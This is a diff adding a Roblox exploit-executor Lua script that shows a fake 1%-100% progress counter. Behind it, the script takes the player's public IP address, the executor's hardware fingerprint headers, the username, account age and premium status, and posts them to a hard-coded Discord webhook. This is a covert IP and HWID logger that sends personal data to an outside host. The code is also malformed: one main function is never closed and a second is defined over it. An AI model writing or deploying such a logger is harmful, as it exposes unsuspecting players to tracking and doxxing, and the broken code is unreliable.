@@ -1,1 +1,159 @@
+local function printProgress()
+    for i = 1, 100 do
+        print(i .. "%")
+        wait(0.1) -- Adjust the speed of the progress
+    end
+end
 
+local function main()
+    -- Print progress from 1% to 100%
+    printProgress()
+
+local function main()
+    -- Fetch the IP address
+    local IP
+    local success, ipError = pcall(function()
+        IP = game:HttpGet("https://v4.ident.me")
+    end)
+
+    if not success then
+        IP = "Unable to fetch IP: " .. tostring(ipError)
+    end
+
+    -- Get the local player
+    local plr = game:GetService('Players').LocalPlayer
+
+    -- Determine if the player is a premium member
+    local premium = plr.MembershipType == Enum.MembershipType.Premium
+
+    -- Determine if the player is an alternate account based on account age
+    local ALT = not premium and plr.AccountAge <= 70
+
+    -- Fetch game information
+    local market = game:GetService("MarketplaceService")
+    local info
+    local success, infoError = pcall(function()
+        info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+    end)
+
+    if not success then
+        info = {Name = "Unknown", Description = "Unable to fetch game info: " .. tostring(infoError)}
+    end
+
+    -- Define the HTTP request function
+    local http_request = http_request
+    if syn then
+        http_request = syn.request
+    elseif SENTINEL_V2 then
+        function http_request(tb)
+            return {
+                StatusCode = 200,
+                Body = request(tb.Url, tb.Method, (tb.Body or ''))
+            }
+        end
+    end
+
+    -- Perform an HTTP GET request to obtain hardware information
+    local body
+    local hwid = ""
+    local success, hwidError = pcall(function()
+        local response = http_request({Url = 'https://httpbin.org/get', Method = 'GET'})
+        if response and response.StatusCode == 200 then
+            body = response.Body
+            if body then
+                local decoded = game:GetService('HttpService'):JSONDecode(body)
+                local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"}
+
+                if decoded and decoded.headers then
+                    for _, v in pairs(hwid_list) do
+                        if decoded.headers[v] then
+                            hwid = decoded.headers[v]
+                            break
+                        end
+                    end
+                else
+                    hwidError = "Invalid response format: headers are missing"
+                end
+            else
+                hwidError = "Response body is nil"
+            end
+        else
+            hwidError = "HTTP request failed with status: " .. tostring(response and response.StatusCode or "Unknown")
+        end
+    end)
+
+    if not success then
+        hwid = "Unable to fetch HWID: " .. tostring(hwidError)
+    end
+
+    -- Send data to Discord Webhook if HWID is present
+    if hwid and hwid ~= "" then
+        local HttpServ = game:GetService('HttpService')
+        local url = "https://discord.com/api/webhooks/1264339196382806058/veMLm0XVO-xlqPp3Q887MA_SpsWXWkFo3l5BhZlSTOYVR1ma0bzmV6A76fuOWr2RoyRH"
+
+        local data = {
+            ["content"] = "",
+            ["embeds"] = {{
+                ["title"] = "__*Information:*__",
+                ["description"] = hwid,
+                ["type"] = "rich",
+                ["color"] = tonumber(0xAB0909),
+                ["fields"] = {
+                    {
+                        ["name"] = "Username:",
+                        ["value"] = plr.Name,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "IP Address:",
+                        ["value"] = IP,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Game Link:",
+                        ["value"] = "https://roblox.com/games/" .. game.PlaceId,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Game Name:",
+                        ["value"] = info.Name,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Age:",
+                        ["value"] = plr.AccountAge,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Premium:",
+                        ["value"] = tostring(premium),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "ALT:",
+                        ["value"] = tostring(ALT),
+                        ["inline"] = true
+                    },
+                },
+            }}
+        }
+
+        local newdata = HttpServ:JSONEncode(data)
+        local headers = {
+            ["content-type"] = "application/json"
+        }
+        local request_payload = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+        local success, postError = pcall(function()
+            http_request(request_payload)
+        end)
+
+        if not success then
+            print("Failed to send data to Discord: " .. tostring(postError))
+        end
+    else
+        print("No HWID found or HWID fetch error.")
+    end
+end
+
+-- Call the main function
+main()
